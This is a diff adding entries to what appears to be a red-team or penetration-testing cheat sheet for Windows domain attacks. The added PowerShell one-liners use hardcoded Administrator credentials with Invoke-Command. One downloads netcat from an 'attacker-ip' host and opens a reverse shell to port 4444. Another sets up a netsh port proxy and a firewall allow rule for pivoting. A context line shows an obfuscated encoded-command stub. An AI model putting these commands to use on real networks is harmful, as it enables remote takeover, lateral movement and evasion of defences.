@@ -102,6 +102,24 @@ Capping hashes from beachhead:
 - powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA=
 
 
+
+***
+
+```powershell
+$pass=(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force); $cred=(New-Object System.Management.Automation.PSCredential("TEST\Administrator", $pass)); Invoke-Command -ComputerName pc-1 -Credential $cred -ScriptBlock { wget http://attacker-ip/nc.exe -O C:\Users\Public\nc.exe; C:\Users\Public\nc.exe -e C:\Windows\system32\nc.exe attacker-ip 4444 }
+```
+
+**Fucking with netsh:**
+```powershell
+$pass=(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force); 
+$cred=(New-Object System.Management.Automation.PSCredential("test.local\Administrator", $pass)); 
+Invoke-Command -ComputerName pc-2.test.local -Credential $cred -ScriptBlock {
+    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=10.0.0.X
+    netsh advfirewall firewall add rule name="My Sweet Local Port" dir=in action=allow protocol=TCP localport=8080
+}
+```
+
+
 ***
 **Obfuscation, patching and evasion**
 
